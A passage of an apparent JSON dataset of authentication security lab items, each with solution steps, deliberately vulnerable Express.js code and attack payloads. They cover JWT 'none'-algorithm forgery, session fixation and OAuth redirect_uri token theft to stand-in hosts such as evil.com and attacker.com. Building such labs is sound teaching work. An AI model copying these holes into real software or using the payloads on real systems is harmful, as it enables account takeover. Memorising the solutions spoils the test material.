    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = payload.payload.sub; if (user === 'admin') return res.send('Welcome admin'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'admin') return res.send('Welcome admin'); res.status(403).send('Forbidden'); } catch { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "This lab's login system is vulnerable to session fixation. Session IDs are accepted via URL parameters and not regenerated upon successful login. The application trusts client-supplied session tokens, enabling an attacker to set a victim's session before login. To solve: set a session token for Carlos, trick him into logging in, then reuse his session to access /my-account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Generate a valid session token for yourself using /login?user=attacker.",
      "Craft a phishing URL with ?session=attacker-session-token and send it to Carlos (simulated).",
      "Carlos logs in using the provided URL. The session remains the same post-login.",
      "Use the same session token to access /my-account as Carlos.",
      "Verify that Carlos's account page is accessible with the fixed session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const cookieParser = require('cookie-parser'); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'qwerty123', 'attacker': 'attackpass' }; app.get('/login', (req, res) => { const { user, session } = req.query; if (users[user]) { const sess = session || Math.random().toString(36).substring(2); sessions[sess] = user; res.cookie('session', sess); res.send('Logged in'); } else { res.status(401).send('Invalid user'); } }); app.get('/my-account', (req, res) => { const sess = req.cookies.session; const user = sessions[sess]; if (user === 'carlos') return res.send('Carlos account page'); res.status(403).send('Unauthorized'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/login?user=carlos&session=attack123",
      "Cookie: session=attack123",
      "GET /my-account with session=attack123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration with open redirect",
    "Lab Description": "The OAuth implementation in this app uses the implicit grant flow without validating redirect URIs correctly. The app also accepts open redirects. By chaining these issues, an attacker can steal access tokens by injecting a malicious redirect URI. To solve: steal Carlos’s OAuth token and use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate an OAuth login and intercept the request to /authorize using OWASP ZAP.",
      "Modify the `redirect_uri` parameter to an attacker-controlled URL with an open redirect back to your server.",
      "Host a simple HTTP listener to capture the token fragment.",
      "Send the phishing OAuth link to Carlos (simulated).",
      "Receive Carlos's token and use Postman to send an authenticated request to /profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const url = require('url'); const tokens = { 'carlos': 'token123' }; const openRedirects = ['/redirect?to=http://evil.com']; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type !== 'token') return res.status(400).send('Invalid response_type'); const parsed = url.parse(redirect_uri); if (!parsed.host) return res.status(400).send('Invalid redirect URI'); const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === tokens['carlos']) return res.send('Carlos profile page'); res.status(403).send('Unauthorized'); }); const PORT = 3002; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://target.com/authorize?client_id=xyz&redirect_uri=http://evil.com/redirect?to=http://attacker.com/capture&response_type=token",
      "#access_token=token123",
      "Authorization: Bearer token123"
    ]
  },
  {
    "Lab scenario": "JWT token manipulation vulnerability in session authorization",
    "Lab Description": "This lab uses JSON Web Tokens (JWT) to manage user sessions. However, it incorrectly validates the token signature due to the use of the 'none' algorithm. The application trusts the user-submitted token without verifying its integrity, enabling privilege escalation via token tampering. To solve: Forge a valid token that grants admin-level access and use it to access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a valid JWT token using Burp Suite's Proxy feature during login.",
      "2. Decode the JWT using jwt.io and observe the algorithm is set to 'HS256'.",
      "3. Change the alg to 'none' and set the payload 'role':'admin'.",
      "4. Remove the JWT signature entirely and re-encode the header and payload.",
      "5. Replace the Authorization header with the forged token in Burp Repeater and access /admin panel."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username: 'admin', role: 'admin' }, 'secret'); res.json({ token }); } else { const token = jwt.sign({ username, role: 'user' }, 'secret'); res.json({ token }); } }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in cookie management",
    "Lab Description": "This lab uses a session cookie to maintain user authentication states. However, the session ID is set before login and is not regenerated upon successful authentication, allowing an attacker to fix a session for a victim before they log in. To solve: Fix a session for Carlos, make him log in, then reuse the session ID to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the login request and observe the Set-Cookie header before authentication.",
      "2. Note the session cookie value and send Carlos a phishing link containing it (simulate via cookie replay).",
      "3. Wait for Carlos to log in (assume passive login simulation).",
      "4. Replay the session ID in a new request with Burp Repeater to access Carlos's authenticated session.",
      "5. Navigate to /my-account using the fixed session cookie to verify the exploit."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); res.cookie('session', sessionId); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/></form>'); }); app.post('/login', (req, res) => { const sessionId = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sessionId] = username; res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Account details for ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Cookie: session=abc123456def789",
      "Cookie: session=fixedsessionidvalue",
      "Cookie: session=carlosSession001"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login endpoint",
    "Lab Description": "This lab uses OAuth for federated login through a third-party provider. However, the redirect URI is not strictly validated, allowing an attacker to manipulate the redirection flow and gain access to a valid session. To solve: Exploit the redirect_uri parameter to hijack a session token from the OAuth flow and log in as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to initiate the OAuth login flow and observe the redirect_uri value.",
      "2. Modify the redirect_uri to a domain controlled by you (simulate local endpoint).",
      "3. Capture the OAuth token or code sent to your malicious redirect.",
      "4. Exchange the captured token for a session using the vulnerable /oauth/callback endpoint.",
      "5. Use the session to access /my-account as the victim user."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'fake-auth-code'; res.redirect(`${redirect_uri}?code=${code}`); }); app.get('/oauth/callback', (req, res) => { const { code } = req.query; if (code === 'fake-auth-code') { res.cookie('session', 'victim-session'); res.send('OAuth login successful'); } else { res.status(401).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const session = req.headers.cookie?.split('=')[1]; if (session === 'victim-session') { res.send('Welcome, OAuth user!'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "https://vulnerable.site/auth?redirect_uri=https://attacker.com/callback",
      "https://vulnerable.site/auth?redirect_uri=http://localhost:1337/hook",
      "https://vulnerable.site/auth?redirect_uri=https://example.com/oauth/exploit"
    ]
  },
  {
    "Lab scenario": "Session fixation attack in login flow",
    "Lab Description": "The session management in this application fails to regenerate session identifiers after login. The application accepts pre-set session cookies from unauthenticated users and continues to use the same session after successful login. To solve: hijack a logged-in session by fixing the session token prior to user authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a GET /login request while unauthenticated and note the session cookie issued.",
      "2. Send a phishing link with your pre-issued session ID as a query parameter to the victim.",
      "3. The victim clicks the link, logs in, and reuses your session ID, which is not regenerated after login.",
      "4. Use the same session ID in your browser and navigate to /account.",
      "5. Verify you have access to the victim’s session by confirming the displayed username."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'secret123', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\">Username: <input name=\"username\"/><br>Password: <input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.redirect('/account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "Set-Cookie: session=12345; path=/",
      "https://target-site.com/login?session=12345",
      "POST /login HTTP/1.1 with Cookie: session=12345"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass in authorization header",
    "Lab Description": "The application uses JWTs for user authentication but fails to validate the signing algorithm securely. It accepts tokens signed using the 'none' algorithm without verifying the signature. The application trusts any decoded payload blindly. To solve: craft a forged JWT that impersonates the admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to capture a request with an Authorization: Bearer <token> header.",
      "2. Decode the JWT using jwt.io and note the algorithm used (likely HS256).",
      "3. Modify the header to {\"alg\":\"none\"} and the payload to {\"user\":\"admin\"}.",
      "4. Remove the signature part of the JWT and send the modified token in the Authorization header.",
      "5. Send a GET request to /admin and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use((req, res, next) => { const authHeader = req.headers.authorization; if (authHeader) { const token = authHeader.split(' ')[1]; try { const user = jwt.decode(token); req.user = user; } catch (e) { return res.status(403).send('Invalid token'); } } next(); }); app.get('/admin', (req, res) => { if (req.user && req.user.user === 'admin') { res.send('Welcome, admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer [spoofed_token]",
      "{\"alg\":\"none\"} + {\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage in redirect URI handler",
    "Lab Description": "This application uses OAuth for authentication, but its redirect URI handler is improperly configured and does not validate the 'state' parameter. An attacker can perform an open redirect and intercept the access token. To solve: steal the OAuth token issued to Carlos and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Register a malicious redirect URI on a phishing domain that you control.",
      "2. Craft an OAuth login link using the original client_id but with your redirect_uri and omit or manipulate the state parameter.",
      "3. Send the crafted link to the victim via email or chat.",
      "4. Once the victim logs in and consents, their token is leaked to your server through the redirect.",
      "5. Use the stolen token in a request to /profile and confirm access to Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); const CLIENT_ID = 'client123'; const REDIRECT_URI = 'http://localhost:4000/oauth/callback'; app.get('/login', (req, res) => { const authURL = `http://authserver.com/auth?response_type=token&client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}`; res.redirect(authURL); }); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; req.session = { token: accessToken }; res.send('Logged in'); }); app.get('/profile', (req, res) => { if (!req.session || !req.session.token) return res.status(403).send('Unauthorized'); request.get({ url: 'http://resource-server.com/userinfo', headers: { Authorization: `Bearer ${req.session.token}` } }, (err, resp, body) => { res.send(body); }); }); app.listen(4000);",
    "payloads": [
      "http://authserver.com/auth?client_id=client123&redirect_uri=https://evil.com/callback&response_type=token",
      "https://evil.com/callback#access_token=eyFakeToken123",
      "Authorization: Bearer eyFakeToken123"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof via algorithm confusion in login API",
    "Lab Description": "The login endpoint accepts JWTs for authentication. The backend library fails to properly validate the 'alg' field, allowing an attacker to switch from a signed algorithm (e.g. HS256) to 'none'. The application trusts the JWT's payload without verifying its authenticity. To solve: Forge a JWT for user 'carlos' using the 'none' algorithm and access the My account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the login request using Burp Suite and capture the JWT from a valid login session.",
      "Send the token to Burp Decoder and decode the JWT structure to review its algorithm and payload.",
      "Manually change the algorithm from HS256 to none and set the payload to {\"username\":\"carlos\"}.",
      "Remove the JWT signature part entirely (keep only header and payload) and use the modified token in the Authorization header.",
      "Send a GET request to /my-account with the forged token and confirm unauthorized access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token); res.send(`Account details for ${payload.username}`); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens in login redirect",
    "Lab Description": "The application initializes session tokens before login and fails to regenerate them after successful authentication. The token remains fixed across the login flow. To solve: Set a known session ID before login, then force a victim (Carlos) to authenticate, hijack their session, and access the My account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and note the Set-Cookie header value (session ID).",
      "Force this session ID using a crafted request or embed it in a link shared with Carlos (e.g., via email phishing).",
      "Wait for Carlos to authenticate using the fixed session ID, thus binding it to his session.",
      "Replay a request to /my-account using the hijacked session cookie.",
      "Verify successful unauthorized access to Carlos’s page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'qwerty123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substr(2); sessions[sid] = { loggedIn: false }; res.setHeader('Set-Cookie', `sid=${sid}`); res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (user && sessions[sid]) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Account details for ${session.username}`); } else { res.status(403).send('Not logged in'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: sid=attackersession",
      "GET /login HTTP/1.1 with sid=attackersession",
      "GET /my-account HTTP/1.1 with sid=attackersession (after Carlos login)"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaks authorization code via Referer",
    "Lab Description": "The OAuth implementation leaks sensitive tokens through HTTP Referer headers. The app includes a third-party analytics script which causes unintentional leakage. To solve: Intercept the OAuth flow and extract Carlos’s authorization code from the Referer header when redirected to a malicious domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in to your account and observe the OAuth redirect flow with tools like Burp Suite or OWASP ZAP.",
      "Inject a malicious redirect_uri during the OAuth initiation phase pointing to your server.",
      "Send Carlos a crafted link to initiate OAuth with redirect_uri set to your controlled server.",
      "When Carlos logs in and authorizes the app, capture the HTTP Referer on your server, containing the authorization code.",
      "Exchange the code at the token endpoint to obtain access to Carlos’s protected resource and retrieve /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const tokens = {}; const users = { 'carlos': { email: 'carlos@example.com' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = authCodes[code]; if (user) { const token = Math.random().toString(36).substring(2); tokens[token] = user; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) { res.send(`Account data for ${user}`); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running'));",
    "payloads": [
      "https://vulnerable.com/oauth/authorize?redirect_uri=https://attacker.com&client_id=abc",
      "Referer: https://attacker.com?code=stolen-code",
      "POST /token with code=stolen-code",
      "Authorization: Bearer <access_token>"
    ]
  },
  {
    "Lab scenario": "JWT secret key vulnerability in API authentication",
    "Lab Description": "The application's REST API uses JWTs for user authentication but fails to validate tokens securely. It uses a weak, guessable HMAC secret. The application trusts tokens even when re-signed with an attacker-supplied secret. To solve: Forge a valid admin JWT and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT after logging in as a normal user",
      "Verify JWT algorithm using jwt.io and identify usage of 'HS256' with weak signature",
      "Attempt to brute-force the secret key using 'jwt-cracker' or 'jwt_tool'",
      "Forge a new JWT with payload {\"role\": \"admin\"} signed with the discovered key",
      "Use Postman to send a GET /admin request with the forged JWT in Authorization header"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = '123456'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') { return res.send('Welcome admin!'); } else { return res.status(403).send('Not authorized'); } } catch (err) { return res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Auth Lab running'));",
    "payloads": [
      "header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, payload: { \"user\": \"carlos\", \"role\": \"admin\" }, secret: '123456'",
      "Authorization: Bearer <forged_JWT_token_with_admin_role>"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application does not issue a new session ID upon successful login, allowing session fixation attacks. Attackers can pre-set session tokens and force victims to authenticate using them. To solve: Fixate a session for Carlos, then access his My account page while impersonating him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to generate a session token by visiting the login page",
      "Send a crafted phishing link to Carlos embedding your session ID in the cookie",
      "Wait for Carlos to authenticate using the fixated session ID",
      "Reuse the same session ID to access GET /my-account endpoint",
      "Verify Carlos's account data and capture the response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); const users = { carlos: 'swordfish' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') { res.send('Sensitive data for Carlos'); } else { res.send('Access denied'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Set-Cookie: sessionID=attackerSessionID",
      "Session fixation via phishing: http://victim.site/login with pre-set sessionID",
      "Reuse sessionID after victim login to access /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth redirect manipulation in third-party login",
    "Lab Description": "The application uses OAuth for third-party authentication but fails to validate redirect URIs properly. This allows attackers to manipulate the flow and steal authorization codes. To solve: Hijack the OAuth code and log in as Carlos by exchanging the stolen token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect the OAuth redirect URL during normal login",
      "Observe that redirect_uri is not validated server-side",
      "Modify redirect_uri to point to attacker-controlled server",
      "Wait for Carlos to initiate login and intercept the authorization code",
      "Exchange the code using curl or Postman to obtain Carlos’s access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const request = require('request'); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; request.post('https://oauth.example.com/token', { form: { code, redirect_uri, client_id: 'abc', client_secret: 'xyz', grant_type: 'authorization_code' } }, (err, _, body) => { const token = JSON.parse(body).access_token; if (token) res.send('Logged in as: ' + token); else res.send('Auth failed'); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "redirect_uri=https://attacker.com/capture",
      "POST https://oauth.example.com/token with intercepted code and attacker redirect_uri",
      "Access-token: Bearer <token-for-carlos>"
    ]
  },
  {
    "Lab scenario": "JWT signature spoof via algorithm confusion",
    "Lab Description": "The application's authentication mechanism uses JWTs for session management. The backend accepts JWTs with the 'alg' header set to 'none', allowing attackers to forge tokens without a signature. The application trusts the contents of the JWT without verifying its signature when 'none' is used. To solve: Forge a JWT to impersonate Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a request with a valid JWT after logging in.",
      "Send the token to Repeater and decode it using jwt.io or any JWT tool.",
      "Replace the 'alg' field in the header with 'none', and manually remove the signature.",
      "Change the payload to {\"username\":\"carlos\"} and re-encode the token.",
      "Set the modified token in the Authorization header and send the request to /my-account to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'mysecretkey'; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ username: user.username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{\"username\":\"carlos\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable session ID",
    "Lab Description": "The login endpoint allows the attacker to specify a session ID in a cookie before logging in. The server reuses this session ID after authentication without regenerating it. This allows session fixation attacks. To solve: Set a session ID before Carlos logs in, then hijack his session using the fixed session token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a GET request to /login with a crafted session ID cookie using Postman or Burp Repeater.",
      "Forward the session cookie to Carlos via phishing or social engineering simulation.",
      "Wait for Carlos to log in using the fixed session ID.",
      "Use Burp to resend a request with the same session ID and access /my-account.",
      "Verify access to Carlos’s account page using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); const sid = req.cookies.session || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('session', sid); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') return res.send('Carlos account page'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=attackersession123",
      "Set session=attackersession123 before victim login",
      "Access /my-account with same cookie after victim logs in"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect exploit",
    "Lab Description": "The application integrates OAuth for user login using a third-party provider. However, the OAuth flow includes an open redirect flaw that allows attackers to hijack authorization codes. The redirect_uri parameter is not properly validated, enabling token leakage. To solve: Hijack Carlos's OAuth login to obtain a valid access token and log in as him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start OAuth flow and intercept the request to the authorization endpoint using Burp.",
      "Modify the redirect_uri to a controlled domain that reflects query parameters (e.g., http://evil.com/callback).",
      "Send a phishing link to Carlos with the crafted redirect_uri.",
      "Capture the leaked authorization code on the attacker's server.",
      "Exchange the stolen code at the token endpoint and use the access_token to call /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query; request.post('https://oauth.provider.com/token', { form: { code, redirect_uri, client_id: 'client123', client_secret: 'secret456', grant_type: 'authorization_code' }}, (err, r, body) => { const token = JSON.parse(body).access_token; if (token) res.redirect(`${redirect_uri}?access_token=${token}`); else res.status(401).send('Token exchange failed'); }); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === 'token-for-carlos') res.send('Carlos OAuth account'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable.com/auth/callback?redirect_uri=http://evil.com/callback",
      "Intercepted code=abc123 from evil.com/callback?code=abc123",
      "POST to token endpoint with stolen code",
      "access_token=token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "The session management system issues session IDs before user authentication, but fails to rotate them upon successful login. This opens the door to session fixation attacks. The application allows setting the session cookie manually and does not regenerate a new session ID post-login. To solve: fixate a session for Carlos before he logs in, then hijack it to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET request to /login page and observe the Set-Cookie header with session ID.",
      "Send the session ID to Burp Repeater and preserve it manually.",
      "Initiate login as 'carlos' using a separate browser or Postman while forcing the reused session cookie.",
      "Confirm that session ID was not regenerated after login by observing session cookie value post-authentication.",
      "Replay a GET /account request using the fixed session ID to gain access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(2); res.cookie('session', sid); sessions[sid] = {}; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.session; sessions[sid].user = username; res.redirect('/account'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const sid = req.cookies.session; const user = sessions[sid]?.user; if (user) { res.send(`Account page for ${user}`); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
    "payloads": [
      "Inject known session ID via Cookie header: Cookie: session=fixedid123",
      "Login as Carlos in another tab using fixedid123",
      "Reuse fixedid123 to access /account as Carlos"
    ]
  },
  {
    "Lab scenario": "JWT token algorithm manipulation",
    "Lab Description": "This lab uses JWTs for user sessions but fails to properly validate the signing algorithm. The application uses a 'none' algorithm without enforcing server-side signature verification. To solve: forge a valid JWT with 'alg' set to 'none' and impersonate the admin user to access their account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman or Burp to capture the JWT token after logging in as a low-privilege user.",
      "Decode the token using jwt.io and note the structure and claims.",
